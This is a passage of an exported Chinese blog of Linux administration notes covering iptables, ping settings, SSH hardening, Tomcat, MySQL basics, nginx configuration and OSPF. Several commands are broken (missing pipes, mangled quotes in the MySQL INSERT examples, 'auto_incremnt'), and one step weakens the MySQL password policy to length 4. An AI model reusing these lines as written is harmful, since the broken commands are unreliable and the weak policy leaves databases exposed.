<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost~]# iptables  -t  filter  -A  INPUT  -p tcp  -j  ACCEPT</span><br><span class="line">//追加规则至filter表中的INPUT链的末尾，允许任何人使用TCP协议访问本机</span><br><span class="line">[root@localhost ~]# iptables  -I  INPUT  -p  udp  -j  ACCEPT</span><br><span class="line">//插入规则至filter表中的INPUT链的开头，允许任何人使用UDP协议访问本机</span><br><span class="line">[root@localhost ~]# iptables  -I  INPUT 2  -p  icmp  -j  ACCEPT</span><br><span class="line">//插入规则至filter表中的INPUT链的第2行，允许任何人使用ICMP协议访问本机</span><br></pre></td></tr></table></figure>

<h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# iptables  -nL  INPUT                    //仅查看INPUT链的规则</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">[root@localhost ~]# iptables  -L  INPUT  --line-numbers        //查看规则，显示行号</span><br><span class="line">num  target     prot opt source         destination</span><br><span class="line">1    ACCEPT     udp   --  anywhere     anywhere</span><br><span class="line">2    ACCEPT     icmp --   anywhere     anywhere</span><br><span class="line">3    ACCEPT     tcp  --   anywhere     anywhere</span><br></pre></td></tr></table></figure>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# iptables  -D  INPUT  3</span><br><span class="line">//删除filter表中INPUT链的第3条规则</span><br><span class="line">[root@localhost ~]# iptables  -nL  INPUT                //查看规则，确认是否删除</span><br><span class="line">[root@localhost ~]# iptables  -F</span><br><span class="line">//清空filter表中所有链的防火墙规则</span><br><span class="line">[root@localhost ~]# iptables  -t  nat  -F</span><br><span class="line">//清空nat表中所有链的防火墙规则</span><br><span class="line">[root@localhost ~]# iptables  -t  mangle  -F</span><br><span class="line">//清空mangle表中所有链的防火墙规则</span><br><span class="line">[root@localhost ~]# iptables  -t  raw  -F</span><br><span class="line">//清空raw表中所有链的防火墙规则</span><br></pre></td></tr></table></figure>

<h2 id="设置默认"><a href="#设置默认" class="headerlink" title="设置默认"></a>设置默认</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# iptables  -t  filter  -P  INPUT  DROP</span><br></pre></td></tr></table></figure>

<h2 id="iptables防火墙过滤与转发"><a href="#iptables防火墙过滤与转发" class="headerlink" title="iptables防火墙过滤与转发"></a>iptables防火墙过滤与转发</h2><h4 id="过滤条件"><a href="#过滤条件" class="headerlink" title="过滤条件"></a>过滤条件</h4><ul>
<li>  协议匹配 -p 协议名称</li>
<li>  地址匹配 -s 源地址 -d 目标地址</li>
<li>  接口匹配 -i 接受数据的网卡 -o 发送数据的网卡</li>
<li>  端口匹配 - -sport 源端口号 –dport 目标端口号</li>
<li>  ICMP类型匹配 - -icmp-type ICMP 类型</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>iPtables</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux禁止ping及开启ping的方法</title>
    <url>/archives/747ef79d.html</url>
    <content><![CDATA[<p>Linux默认是允许Ping响应的，系统是否允许Ping由2个因素决定的：A、内核参数，B、防火墙，需要2个因素同时允许才能允许Ping，2个因素有任意一个禁Ping就无法Ping。</p>
<span id="more"></span>


<h2 id="修改内核参数"><a href="#修改内核参数" class="headerlink" title="修改内核参数"></a>修改内核参数</h2><p>1.1 允许ping配置</p>
<ul>
<li><p>临时</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all      //临时允许ping</span><br></pre></td></tr></table></figure>
</li>
<li><p>永久允许ping配置</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf </span><br><span class="line">net.ipv4.icmp_echo_ignore_all=0  //增加这一行</span><br><span class="line">如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改=号后面的值即可的（0表示允许，1表示禁止）。</span><br><span class="line">修改完成后执行sysctl -p使新配置生效。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>1.2 禁止ping配置</p>
<ul>
<li>临时  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1 &amp;gt;/proc/sys/net/ipv4/icmp_echo_ignore_all  </span><br></pre></td></tr></table></figure>
</li>
<li>永久  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf </span><br><span class="line">net.ipv4.icmp_echo_ignore_all=1  //增加这一行</span><br><span class="line">如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改=号后面的值即可的（0表示允许，1表示禁止）。</span><br><span class="line">修改完成后执行sysctl -p使新配置生效。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><ul>
<li>  这里以Iptables防火墙为例，其他防火墙操作方法可参考防火墙的官方文档。</li>
</ul>
<p>2.1、允许PING设置</p>
<pre><code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT</span><br><span class="line"> iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT</span><br><span class="line">或者也可以临时停止防火墙操作的。</span><br><span class="line"> service iptables stop</span><br></pre></td></tr></table></figure>
</code></pre>
<p>2.2、禁止PING设置</p>
<pre><code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br></pre></td></tr></table></figure>
</code></pre>
<ul>
<li>  注:此处的方法的前提是内核配置是默认值，也就是没有禁止Ping</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux用户管理、禁止ssh远程登录以及修改ssh默认端口</title>
    <url>/archives/bfd345ac.html</url>
    <content><![CDATA[<p>一般Liniux是默认允许root远程登录，以及ssh默认端口为22，出于安全的考虑，建议更改ssh配置文件禁止root远程登录和修改默认端口。</p>
<span id="more"></span>

<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><ul>
<li>  添加用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd 用户名</span><br><span class="line">passwd 用户名  //为用户设置密码</span><br><span class="line">echo “password” passwd --stdin 用户名  //另外一种设置密码</span><br></pre></td></tr></table></figure>

<ul>
<li>  删除用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userdel 用户名</span><br></pre></td></tr></table></figure>

<h2 id="修改ssh默认端口"><a href="#修改ssh默认端口" class="headerlink" title="修改ssh默认端口"></a>修改ssh默认端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"># port 22  //找到这个字段取消前面#注释 更改默认端口</span><br><span class="line">wq 保存退出</span><br><span class="line">systemctl restart sshd                       重启ssh服务</span><br></pre></td></tr></table></figure>

<h2 id="禁止root远程登录"><a href="#禁止root远程登录" class="headerlink" title="禁止root远程登录"></a>禁止root远程登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"># PermitRootLogin yes //找到这个字段，去掉#注释 把yes改为no</span><br><span class="line">wq 保存退出</span><br><span class="line">systemctl restart sshd  // 重启ssh服务</span><br></pre></td></tr></table></figure>

<p>注：如果系统开启的iptables防火墙，需要把端口添加进去。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux（centos7）使用Tomcat部署虚拟主机</title>
    <url>/archives/dd539ea3.html</url>
    <content><![CDATA[<p>接着上次部署的Tomcat，这次同样在阿里云主机上做的测试，由于有一个域名无法完成备案，只能在命令行看到测试结果。</p>
<span id="more"></span>

<h2 id="部署虚拟主机"><a href="#部署虚拟主机" class="headerlink" title="部署虚拟主机"></a>部署虚拟主机</h2><p>下面首先要修改server.xml配置文件，如下图： </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909296.png"> </p>
<p>保存退出。然后就是创建网站目录及测试页面 提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@SZ-centos tomcat]# mkdir -p  &#123;test1,test2&#125;/ROOT</span><br><span class="line">[root@SZ-centos tomcat]# echo &quot;AAAAAAA&quot; &gt; test1/ROOT/index.html</span><br><span class="line">[root@SZ-centos tomcat]# echo &quot;BBBBBBB&quot; &gt; test2/ROOT/index.html</span><br><span class="line">[root@SZ-centos tomcat]# bin/shutdown.sh //关闭服务</span><br><span class="line">[root@SZ-centos tomcat]# bin/startup.sh  //启动服务</span><br></pre></td></tr></table></figure>

<p>接下来用浏览器进行测试，结果如下：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909295.png"> </p>
<p>另外一个域名的访问结果： </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909294.png"></p>
<h2 id="修改网站访问目录"><a href="#修改网站访问目录" class="headerlink" title="修改网站访问目录"></a>修改网站访问目录</h2><p>首先需要修改server.xml配置文件，如下图： </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909293.png"></p>
<p>保存退出之后需要创建网站目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@SZ-centos tomcat]# mkdir test2/test4</span><br><span class="line">[root@SZ-centos tomcat]# echo &quot;test&quot; &gt; test2/test4/index.xml</span><br><span class="line">//重启服务时出现关不掉服务的情况，可以用kill命令杀掉进程</span><br><span class="line">[root@SZ-centos tomcat]# ps -e  grep java</span><br><span class="line">[root@SZ-centos tomcat]# kill -9 进程号</span><br><span class="line">//当访问时出现加载特别慢的情况，这里我是用的rng-tools这个包解决的</span><br><span class="line">[root@SZ-centos tomcat]# yum -y install rng-tools</span><br><span class="line">[root@SZ-centos tomcat]# systemctl start rngd</span><br></pre></td></tr></table></figure>

<p>之后访问就没有问题了，结果如图： </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909292.png"></p>
<h2 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h2><p>修改server.xml配置文件 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909291.png"> </p>
<p>编辑一个测试页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@SZ-centos tomcat]# echo &quot;&lt;marquee&gt;this is a test page &lt;/marquee&gt;&quot; &gt; /var/www/html/www.html</span><br></pre></td></tr></table></figure>

<p>访问结果如下图： </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/20190929.png"> </p>
<p>当访问test4这个路径时会跳转到/var/www/html/这个路径。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库的基础命令</title>
    <url>/archives/480f016b.html</url>
    <content><![CDATA[<p>日常记录一下mysql的基础命令，包括密码更改、增、删、改、查以及用户授权。</p>
<span id="more"></span>

<h3 id="更改登录密码"><a href="#更改登录密码" class="headerlink" title="更改登录密码"></a>更改登录密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global validate_password_policy=0;  //更改密码策略</span><br><span class="line">set global validate_password_length=4;  //更改密码长度</span><br><span class="line">alter user root@‘localhost’ identified by &#x27;密码&#x27;;  //设置数据库管理员root密码</span><br></pre></td></tr></table></figure>

<h3 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all  privileges on 数据库名字.* to 用户名@‘localhost‘ identified by ’密码’;   //给用户一个库的所有权限</span><br><span class="line">grant all  privileges on 数据库名字.表名 to 用户名@’localhost’ identified by‘密码’;  //给用户一个库中的一个表的所有权限</span><br></pre></td></tr></table></figure>

<h4 id="权限字段"><a href="#权限字段" class="headerlink" title="权限字段"></a>权限字段</h4><ul>
<li>  all privileges:所有权限</li>
<li>  select：读取权限</li>
<li>  delete：删除权限</li>
<li>  update：写权限</li>
<li>  create：创建权限</li>
<li>  drop：删除权限</li>
</ul>
<h4 id="数据库字段"><a href="#数据库字段" class="headerlink" title="数据库字段"></a>数据库字段</h4><ul>
<li>  *.* ：指定数据库中所有的库和表</li>
<li>  数据库名字.* :指定某一个数据库下的所有表</li>
<li>  库名.表名：指定某个库中的某个表</li>
</ul>
<h4 id="用户字段"><a href="#用户字段" class="headerlink" title="用户字段"></a>用户字段</h4><ul>
<li>  localhost：只允许用户本地登录</li>
<li>  %：允许除本机外任何一个地方登录</li>
<li>  IP地址：指定ip登录</li>
</ul>
<h3 id="库的基本操作"><a href="#库的基本操作" class="headerlink" title="库的基本操作"></a>库的基本操作</h3><ul>
<li>  增：在data文件夹下，创建出一个db文件夹（db数据库），编码方式不指定则以默认的为准</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database db charset utf8;</span><br></pre></td></tr></table></figure>

<ul>
<li>  删：删除数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database db;</span><br></pre></td></tr></table></figure>

<ul>
<li>  改：更改数据库、一般都是更改编码方式。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database db charset gbk;</span><br></pre></td></tr></table></figure>

<ul>
<li>  查：查询数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看data文件夹下的所有的数据库</span><br><span class="line"> show databases;</span><br><span class="line"> 查看创建的数据库db的数据结构，可以看到其指定的编码。</span><br><span class="line">show create database db;</span><br></pre></td></tr></table></figure>

<h3 id="表的基本操作"><a href="#表的基本操作" class="headerlink" title="表的基本操作"></a>表的基本操作</h3><ul>
<li>  切换文件夹（数据库）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use db; //创建表前需先切到具体的文件夹下，否则会因无指定文件夹报错，也可在创建表前指定。</span><br></pre></td></tr></table></figure>

<ul>
<li>  查看当前所在的库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure>

<p>增：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t1(id int,name char); #创建表前需指定字段类型，且不为空，字段放在括号内，并用逗号隔开</span><br><span class="line">create table db.t1(id int,name char); #创建表时若没有切换到指定的文件夹下，则在表名前添加库名即可</span><br><span class="line">create table t2(id int primary key auto_incremnt,name char(15));</span><br><span class="line">#创建有主键的表，主键：id不能为空且唯一，且为自增长，故插入记录时不需传入id的值</span><br></pre></td></tr></table></figure>

<ul>
<li>  删</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table t1; #直接指定删除的表名即可</span><br></pre></td></tr></table></figure>

<ul>
<li>  改、改变表结构</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table t1 add age int; #，add:向表中添加新的字段，并指定字段的类型，不需要用括号</span><br><span class="line">alter table t1 modify name char(15); #modify：修改表中字段的类型，不可修改字段名</span><br><span class="line">alter table t1 change name NAME char(15); #change:修改字段名和字段的类型</span><br><span class="line">alter table department rename to dep; #对表名进行重新命名</span><br><span class="line">alter table t1 drop age; #删除表中某一个字段，字段下的记录会一同被删除</span><br></pre></td></tr></table></figure>

<ul>
<li>  查</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables; #查看当前库下创建的所有表，查看出的表会显示在哪个库下的</span><br><span class="line">show create table t1; #查看具体的某一个表的表结构但是该表结构看上去有点乱</span><br><span class="line">desc t1; #查看表的表结构，比上面的方法查看的规整</span><br><span class="line">describe t1;来进行查询表的表结构</span><br></pre></td></tr></table></figure>

<h3 id="数据的基本操作"><a href="#数据的基本操作" class="headerlink" title="数据的基本操作"></a>数据的基本操作</h3><ul>
<li> 增</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into t1(id,name) values (1,jiang&#x27;), (2,1L)(,&quot;x);</span><br><span class="line"></span><br><span class="line">向表中插入记录，字段名必须和值对应，值用括号进行插入，每插入一组值用逗号隔开，分号结束</span><br><span class="line"></span><br><span class="line">insert into t2(name) values (jing,(LL), (&#x27;cs&quot;);</span><br><span class="line"></span><br><span class="line">有主键表的插入操作</span><br></pre></td></tr></table></figure>

<ul>
<li>  删</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from db1.t1 where id &amp;gt;= 2;删除记录，不改变值结构，不重新排序</span><br><span class="line">清空表：</span><br><span class="line">truncate t2; #清空表中内容，字段id再插入值时从1增长，delete是接着上次id的值继续增长。</span><br></pre></td></tr></table></figure>

<ul>
<li>  改</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update db1.t1 set name=&amp;#039;lxx_dsb&amp;#039; where id=2; #修改值，set指定字段名，后面跟约束条件。</span><br></pre></td></tr></table></figure>

<ul>
<li>  查</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from db1.t1; #指定要查看表中哪个字段下的内容</span><br><span class="line">select id,name from t1; #指定查看多个字段下的内容</span><br><span class="line">select name,id from t1; #查看多个字段时可以调换字段的顺序，并不会存储的顺序</span><br><span class="line">select * from t1; #“*”：查看所有的字段下的记录</span><br><span class="line">select * from t1 where id &amp;gt;= 2; #查询所有字段是加上约束条件，精准的查询想要的记录</span><br></pre></td></tr></table></figure>

<hr>
<p>版权声明：本文参照CSDN博主「江江呀」的原创文章创作。 原文链接：<a href="https://blog.csdn.net/qq_40671789/article/details/101078308">https://blog.csdn.net/qq_40671789/article/details/101078308</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>mysql数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>lnmp安装typecho及所遇到的错误解决方法</title>
    <url>/archives/9b1feeaf.html</url>
    <content><![CDATA[<p>之前用宝塔面板安装的lnmp，一段时间之后不知道为什么出现了面板与nginx服务的冲突，由于没有能力解决，所以换了lnmp一键安装脚本，下面记录下安装typecho过程中碰到的问题以及解决方法。</p>
<span id="more"></span>

<h2 id="lnmp添加虚拟主机"><a href="#lnmp添加虚拟主机" class="headerlink" title="lnmp添加虚拟主机"></a>lnmp添加虚拟主机</h2><p>脚本说明官方有在这里就不详细说明了，有一点注意的是需要开启伪静态。</p>
<h2 id="访问后台出现404"><a href="#访问后台出现404" class="headerlink" title="访问后台出现404"></a>访问后台出现404</h2><p>我在安装界面安装完之后登陆登陆后台时出现404错误，经搜索解决方法如下：<br>修改虚拟主机nginx文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//原字段</span><br><span class="line">include enable-php.conf</span><br><span class="line">//修改为</span><br><span class="line">include enable-php-pathinfo.conf</span><br></pre></td></tr></table></figure>
<p>重新加载nginx配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>
<p>再次访问后台一切正常。</p>
<h2 id="添加SSL证书后网站出现404"><a href="#添加SSL证书后网站出现404" class="headerlink" title="添加SSL证书后网站出现404"></a>添加SSL证书后网站出现404</h2><p>修改nginx虚拟机配置文件443端口下面的字段值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//原字段</span><br><span class="line">include enable-php.conf</span><br><span class="line">//修改为</span><br><span class="line">include enable-php-pathinfo.conf</span><br></pre></td></tr></table></figure>
<p>第二步修改typecho根目录下config.inc.php文件，在配置文件中添加下面代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** 开启HTTPS *</span><br><span class="line">/define(&#x27;__TYPECHO_SECURE__&#x27;,true);</span><br></pre></td></tr></table></figure>
<p>再次执行重新加载nginx配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>
<p>加载完访问即可。</p>
<h2 id="出现-error-establishing-a-database-connection"><a href="#出现-error-establishing-a-database-connection" class="headerlink" title="出现 error establishing a database connection"></a>出现 error establishing a database connection</h2><p>这个问题也是百思不得其解，网站正常运行之后并没有做其他操作，只是用漏洞工具扫描了一番。<br>后来发现可以访问安装页面install.php,又重新走了一遍流程，至此结束，目前访问正常。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>typecho</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx只允许域名访问禁止IP访问</title>
    <url>/archives/6e6b9b75.html</url>
    <content><![CDATA[<p>默认情况下，只要将域名解析到主机的IP上，访问该域名就可以访问到lnmp的默认页面，出于安全的考虑。修改Nginx配置文件禁止IP访问。</p>
<span id="more"></span>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>配置文件路径为：/usr/local/nginx/conf/nginx.conf  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        server_name _;</span><br><span class="line">        return 500;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>  return 500 这个字段也可以改为 rewrite ^(.*) <a href="http://www.google.com/">http://www.google.com</a> permanent;当用IP访问你的网站的时候会自动跳转到谷歌搜索的主页。</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>NGINX</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx重定向非www到www</title>
    <url>/archives/b7d4cf57.html</url>
    <content><![CDATA[<p>记录非www域名全部重定向到www，和www重定向到一级域名。</p>
<span id="more"></span>

<h1 id="非www重定向到www"><a href="#非www重定向到www" class="headerlink" title="非www重定向到www"></a>非www重定向到www</h1><ul>
<li>编辑nginx网站配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssl_certificate /etc/nginx/ssl/server.crt;</span><br><span class="line">ssl_certificate_key /etc/nginx/ssl/server.key;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">     listen 80;</span><br><span class="line">     server_name www.domain.com domain.com;</span><br><span class="line">     return 301 https://www.domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">     listen 443 ssl;</span><br><span class="line">     server_name domain.com;</span><br><span class="line">     return 301 https://www.domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">     listen 443 ssl;</span><br><span class="line">     server_name www.domain.com;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="www重定向到一级域名"><a href="#www重定向到一级域名" class="headerlink" title="www重定向到一级域名"></a>www重定向到一级域名</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssl_certificate /etc/nginx/ssl/server.crt;</span><br><span class="line">ssl_certificate_key /etc/nginx/ssl/server.key;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">     listen 80;</span><br><span class="line">     server_name www.domain.com domain.com;</span><br><span class="line">     return 301 https://domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">     listen 443 ssl;</span><br><span class="line">     server_name www.domain.com;</span><br><span class="line">     return 301 https://domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">     listen 443 ssl;</span><br><span class="line">     server_name domain.com;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>OSPF原理与基础配置</title>
    <url>/archives/8c9c8a67.html</url>
    <content><![CDATA[<p>记录了一下关于路由协议方面的知识。</p>
<span id="more"></span>

<h2 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h2><ul>
<li>路由器之间用来交换信息的语言</li>
<li>动态路由不需要手工写路由</li>
<li>路由器之间能够自己互相学习</li>
<li>网络中静态路由和动态路由互相补充</li>
</ul>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>减少了任务管理</li>
<li>占用了网络带宽</li>
</ul>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>内部网关协议（IGP）：RIP、OSPF、IS-IS</li>
<li>外部网关协议（EGP）：BGP</li>
<li>距离矢量路由协议：依据从源网络到目标网络所经过的路由器的个数选择路由，如：RIP、IGRP</li>
<li>链路状态路由协议：综合考虑从源网络到目标网络的各条路径的情况选择路由，如：OSPF、IS-IS</li>
</ul>
<h2 id="OSPF原理"><a href="#OSPF原理" class="headerlink" title="OSPF原理"></a>OSPF原理</h2><ul>
<li>OSPF工作过程 邻居列表—&gt;链路状态数据库—&gt;路由表</li>
<li>OSPF区域<ul>
<li>  为了适应大型的网络，ospf在AS内划分多个区域</li>
<li>  每个ospf路由器只维护所在区域的完整链路状态信息</li>
</ul>
</li>
<li>区域ID<ul>
<li>  区域ID可以表示成一个十进制的数字</li>
<li>  也可以表示成一个IP地址的格式</li>
</ul>
</li>
<li>骨干区域Area 0<ul>
<li>  负责区域间路由信息传播</li>
</ul>
</li>
<li>非骨干区域</li>
<li>router ID<ul>
<li>  ospf区域内路由器的唯一标识</li>
</ul>
</li>
<li>router ID选取规则<ul>
<li>  使用router-id命令指定router ID</li>
<li>  如果没有手工指定，则优先选取路由器loopback接口上数值最高的IP地址；如果没有loopback接口，则在物理端口中选取IP地址最高的</li>
</ul>
</li>
<li>ospf的度量值为cost<ul>
<li>  cost= 参考带宽/实际带宽 //默认参考带宽为100M</li>
<li>  最短路径是基于接口指定的代价（cost）计算的</li>
</ul>
</li>
</ul>
<h2 id="DR与BDR"><a href="#DR与BDR" class="headerlink" title="DR与BDR"></a>DR与BDR</h2><ul>
<li>DR与BDR的选举方法 -自动选举：网段上router id最大的路由器将被选取为DR，第二大的将被选举为BDR</li>
<li>手动选择：<ul>
<li>  优先级范围是0-255，数值越大，优先级越高，默认为1</li>
<li>  如果优先级相同，则需要比较router id</li>
<li>  如果路由器的优先级被设置为0，它将不参与DR和BDR的选举</li>
</ul>
</li>
<li>DR与BDR的选举过程 -路由器的优先级可以影响一个选举过程，但是它不能强制更换已经存在的DR或BDR路由器</li>
<li>OSPF的组播地址：<ul>
<li>  224.0.0.5</li>
<li>  224.0.0.6</li>
</ul>
</li>
<li>OSPF的特点：<ul>
<li>  可适应大规模网络</li>
<li>  路由变化收敛速度快</li>
<li>  无路由环</li>
<li>  支持变长子网掩码VLSM</li>
<li>  支持区域划分</li>
<li>  支持以组播地址发送协议报文</li>
</ul>
</li>
<li>OSPF将网络划分为四种类型： 1.p2p网络（point-to-point） 2.广播型网络（broadcast） 3.NBMA网络（none broadcast multiaccess，NBMA） 4.P2MP网络（point-to-multipoint）</li>
</ul>
<h2 id="OSPF多区域"><a href="#OSPF多区域" class="headerlink" title="OSPF多区域"></a>OSPF多区域</h2><ul>
<li>产生ospf多区域的原因：<ul>
<li>  增强网络的可扩展性</li>
<li>  降低路由器负载</li>
<li>  快速收敛</li>
</ul>
</li>
<li>ospf的三种通信量：<ul>
<li>  域内通信量（intra-area traffic）：单个区域内路由器之间交换数据包构成的通信量</li>
<li>  域间通信量（inter-area traffic）：不同区域的路由器之间交换数据包构成通信量</li>
<li>  外部通信量（external traffic）：ospf域内的路由器与域外或另一个自治系统内的路由器之间交换数据包构成的通信量</li>
</ul>
</li>
<li>ospf的区域类型<ul>
<li>  骨干区域area 0</li>
<li>非骨干区域：<ul>
<li>  标准区域</li>
<li>  stub区域</li>
<li>  totally stub区域</li>
<li>  nssa区域</li>
<li>  totally nssa区域</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="多区域配置"><a href="#多区域配置" class="headerlink" title="多区域配置"></a>多区域配置</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092922.png"></p>
<ul>
<li>R1配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 10.10.10.2 30</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 13.13.13.2 30</span><br><span class="line">[Huawei] ospf 1 router-id 4.4.4.4</span><br><span class="line">[Huawei-ospf-1] area 0</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] network 13.13.13.0 0.0.0.3</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] network 10.10.10.0 0.0.0.3</span><br></pre></td></tr></table></figure>

<ul>
<li>R2配置</li>
</ul>
